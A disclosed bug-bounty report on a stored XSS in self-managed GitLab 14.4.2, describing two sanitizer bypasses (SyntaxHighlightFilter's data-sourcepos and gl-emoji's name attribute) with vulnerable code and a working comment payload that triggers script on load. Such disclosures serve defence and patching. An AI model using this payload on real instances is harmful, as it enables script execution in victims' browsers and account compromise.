# Stored XSS on issue comments and other pages which contain notes

## Report Details
- **Report ID**: 1398305
- **URL**: https://hackerone.com/reports/1398305
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-11-11T14:55:36.689Z
- **Disclosed**: 2022-06-08T14:02:11.747Z

## Reporter
- **Username**: jarij
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

This report contains two XSS sanitization bypasses:

* The [SyntaxHighlightFilter](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb) creates html from unsanitized data. This can be used to bypass the XSS filter on the server-side. 

```ruby
 def highlight_node(node)
...
sourcepos = node.parent.attr('data-sourcepos')
...
sourcepos_attr = sourcepos ? "data-sourcepos=\"#{sourcepos}\"" : ""

 highlighted = %(<pre #{sourcepos_attr} class="#{css_classes}"
                             lang="#{language}"
                             #{lang_params}
                             v-pre="true"><code>#{code}</code></pre>)
```

* The [gl-emoji](https://gitlab.com/gitlab-org/gitlab/-/blob/5b0bedde99d676116221b56ad75fa89ccf8a9f28/app/assets/javascripts/behaviors/gl_emoji.js) custom element can be used to bypass the gitlab-ui `v-safe-html` directive sanitization on the frontend side by injecting the payload into the name attribute:

```js
export function emojiImageTag(name, src) {
  return `<img class="emoji" title=":${name}:" alt=":${name}:" src="${src}" width="20" height="20" align="absmiddle" />`;
}
```

* Gitlab SaaS is not vulnerable because this report does not include CSP bypass. I'm currently working on this.

### Steps to reproduce

{F1510920}

1. Launch self-managed Gitlab instance
2. Create issue
3. Copy and paste the following payload into the comment field:

```
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

#### Results of GitLab environment info

```
# gitlab-rake gitlab:env:info         

System information
System:
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.4p191
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.6
Redis Version:  6.0.16
Git Version:    2.33.0.
Sidekiq Version:6.2.2
Go Version:     unknown

GitLab information
Version:        14.4.2-ee
Revision:       84aa6daaffd
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.7
URL:            http://localhost:8888
HTTP Clone URL: http://localhost:8888/some-group/some-project.git
SSH Clone URL:  git@localhost:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        13.21.1
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

Attacker who can comment on issue will be able to XSS users that visit that issue. This also affects other pages where comments can be posted, such as snippets.

## Attachments
- xss-poc.webm
